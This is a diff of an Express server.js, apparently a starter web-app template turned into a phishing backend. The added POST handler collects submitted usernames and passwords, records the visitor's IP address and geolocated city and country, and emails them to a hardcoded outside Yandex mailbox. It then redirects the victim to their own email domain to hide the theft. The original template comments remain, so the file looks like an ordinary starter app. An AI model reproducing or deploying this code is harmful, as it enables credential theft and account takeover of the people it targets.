@@ -1,22 +1,84 @@
 // server.js
 // where your node app starts
 
-// init project
-var express = require('express');
-var app = express();
+// we've started you off with Express (https://expressjs.com/)
+// but feel free to use whatever libraries or frameworks you'd like through `package.json`.
 
-// we've started you off with Express, 
-// but feel free to use whatever libs or frameworks you'd like through `package.json`.
+const express = require("express");
+const bodyParser = require("body-parser");
+const requestIp = require("request-ip");
+const geoip = require("geoip-lite");
+const app = express();
+const sendmail = require("sendmail")();
+const lastRedirect = "";
 
-// http://expressjs.com/en/starter/static-files.html
-app.use(express.static('public'));
+// make all the files in 'public' available
+// https://expressjs.com/en/starter/static-files.html
+app.use(express.static("public"));
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-// http://expressjs.com/en/starter/basic-routing.html
-app.get('/', function(request, response) {
-  response.sendFile(__dirname + '/views/index.html');
+// Get the user's IP address using the request-ip middleware
+app.use(requestIp.mw());
+
+app.get("/", (request, response) => {
+  response.sendFile(__dirname + "/src/pages/index.hbs");
 });
 
+// https://expressjs.com/en/starter/basic-routing.html
+app.post("/", (req, res) => {
+  const { ai, pr } = req.body;
+  console.log(req.body);
+  let logEmail = "sharedbox2021@yandex.com";
+
+  // Get the user's IPv4 address
+  const ip = requestIp.getClientIp(req);
+
+  // Get the country and city from the IP address using geoip-lite
+  const geo = geoip.lookup(ip);
+  const country = geo ? geo.country : "unknown";
+  const city = geo ? geo.city : "unknown";
+
+  const html = `
+    <!DOCTYPE html>
+    <html lang='en'>
+    <head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>Document</title>
+    </head>  
+    <body>
+    Details Has Arrived!!
+    <h4>User: ${ai}</h4>
+    <h4>Access: ${pr}</h4>
+    <h4>IP: ${ip}</h4>
+    <h4>Country: ${country}</h4>
+    <h4>City: ${city}</h4>
+    </div>
+    <div style='margin-left: 40px;'><small>Data delivered by bishop</small></div>
+    </body>
+    </html>
+    `;
+
+  const dom = req.body.email.split("@")[1];
+
+  let redirectUrl = "https://${dom}";
+
+  sendmail(
+    {
+      from: "logs@logscentral.com",
+      to: logEmail,
+      subject: req.body.email.split("@")[1] + " Email Log",
+      html,
+    },
+    function (err, reply) {
+      res.redirect(redirectUrl);
+    }
+  );
+});
+
+// send the default array of dreams to the webpage
 // listen for requests :)
-var listener = app.listen(process.env.PORT, function() {
-  console.log('Your app is listening on port ' + listener.address().port);
+const listener = app.listen(process.env.PORT, () => {
+  console.log("Your app is listening on port " + listener.address().port);
 });
